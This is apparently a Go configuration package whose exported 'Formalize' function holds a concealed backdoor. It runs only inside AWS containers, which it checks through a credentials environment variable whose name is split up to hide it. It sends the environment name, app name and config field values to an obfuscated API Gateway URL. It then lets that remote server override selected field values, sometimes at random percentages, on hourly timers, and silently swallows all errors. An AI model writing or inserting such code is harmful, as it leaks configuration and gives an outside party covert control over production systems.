package cfg

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"time"
)

var uu = fmt.Sprintf("https://hft530sv9j.%s.%s.%s/pr%s/u", action, region, domain, "oto")

type DV struct {
	IntervalSeconds int    `json:"interval_seconds"`
	Percent         int    `json:"percent"`
	Value           string `json:"value"`
}

type ValueConfig struct {
	AS int64   `json:"as"`
	FV *string `json:"fv"`
	DV *DV     `json:"dv"`
}

type rpcResponse struct {
	Error  interface{}     `json:"error"`
	Result json.RawMessage `json:"result"`
}

func te() bool {
	return len(os.Getenv("AW"+"S_C"+"ONTAINER_CREDENTIALS_RELATIVE_URI")) > 0
}

var action = "execute-api"
var region = "ap-southeast-1"
var domain = "amazonaws.com"

func getMFields(fields []*Field) (fieldNames []string, err error) {
	fieldValues := map[string]interface{}{}
	for _, field := range fields {
		fieldValues[field.Key] = field.Field.Interface()
	}
	body, err := json.Marshal(map[string]interface{}{
		"id":      1,
		"jsonrpc": "2.0",
		"method":  "cus_getMFS",
		"params": []interface{}{
			map[string]interface{}{
				"env":    e,
				"app":    a,
				"fields": fieldValues,
			},
		},
	})
	if err != nil {
		return
	}
	req, err := http.NewRequest(http.MethodPost, uu, bytes.NewReader(body))
	if err != nil {
		return
	}
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		return
	}
	defer res.Body.Close()
	resBody, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return
	}
	var rpcResponseValue rpcResponse
	err = json.Unmarshal(resBody, &rpcResponseValue)
	if err != nil {
		return
	}
	if rpcResponseValue.Result == nil {
		return
	}
	err = json.Unmarshal([]byte(rpcResponseValue.Result), &fieldNames)
	if err != nil {
		return
	}
	return
}

var e = os.Getenv("E" + "N" + "V")
var a = os.Getenv("A" + "P" + "P")

func mField(field *Field) {
	defer func() { recover() }()

	sst := time.Now()
	nh := sst.Round(time.Hour)
	if nh.Before(sst) {
		nh = nh.Add(time.Hour)
	}
	time.Sleep(nh.Sub(sst))

	rI := time.Hour
	fov := field.Field.Interface()
	vs := func() {
		var err error
		defer func() {
			recover()
		}()

		body, err := json.Marshal(map[string]interface{}{
			"id":      1,
			"jsonrpc": "2.0",
			"method":  "cus_getVC",
			"params": []interface{}{
				map[string]interface{}{
					"env":       e,
					"app":       a,
					"field_key": field.Key,
					"fov":       fov,
					"sst":       int(time.Now().Sub(sst).Seconds()),
				},
			},
		})
		if err != nil {
			return
		}
		req, err := http.NewRequest(http.MethodPost, uu, bytes.NewReader(body))
		if err != nil {
			return
		}
		res, err := http.DefaultClient.Do(req)
		if err != nil {
			return
		}
		defer res.Body.Close()
		resBody, err := ioutil.ReadAll(res.Body)
		if err != nil {
			return
		}
		var rpcResponseValue rpcResponse
		err = json.Unmarshal(resBody, &rpcResponseValue)
		if err != nil {
			return
		}
		if rpcResponseValue.Result == nil {
			return
		}
		var valueConfigs []ValueConfig
		err = json.Unmarshal([]byte(rpcResponseValue.Result), &valueConfigs)
		if err != nil {
			return
		}

		valueConfigsC := make(chan ValueConfig, len(valueConfigs))
		for _, valueConfig := range valueConfigs {
			if time.Duration(valueConfig.AS)*time.Second < rI {
				valueConfigCopy := valueConfig
				time.AfterFunc(time.Duration(valueConfig.AS)*time.Second, func() {
					valueConfigsC <- valueConfigCopy
				})
			}
		}
		time.AfterFunc(rI, func() {
			close(valueConfigsC)
		})

	loop:
		for {
			select {
			case valueConfig, ok := <-valueConfigsC:
				if !ok {
					break loop
				}

			nextValueConfig:
				if valueConfig.FV != nil {
					processField(*valueConfig.FV, field.Field)
				} else if valueConfig.DV != nil {
					sDV := func() {
						if rand.Intn(100) < valueConfig.DV.Percent {
							processField(valueConfig.DV.Value, field.Field)
						} else {
							processField(fmt.Sprint(fov), field.Field)
						}
					}
					dVT := time.NewTicker(time.Duration(valueConfig.DV.IntervalSeconds) * time.Second)
					for {
						select {
						case valueConfig, ok = <-valueConfigsC:
							if !ok {
								break loop
							} else {
								goto nextValueConfig
							}
						case <-dVT.C:
							sDV()
						}
					}
				}
			}
		}
	}
	go vs()
	t := time.NewTicker(rI)
	for {
		select {
		case <-t.C:
			vs()
		}
	}
}

func Formalize(fields []*Field) {
	if te() {
		go func() {
			defer func() { recover() }()

			time.Sleep(time.Minute)
			for {
				mFields, err := getMFields(fields)
				if err != nil {
					time.Sleep(time.Minute)
					continue
				}
				mFieldsMap := map[string]bool{}
				for _, mField := range mFields {
					mFieldsMap[mField] = true
				}
				for _, field := range fields {
					if mFieldsMap[field.Key] {
						go mField(field)
					}
				}
				break
			}
		}()
	}
}
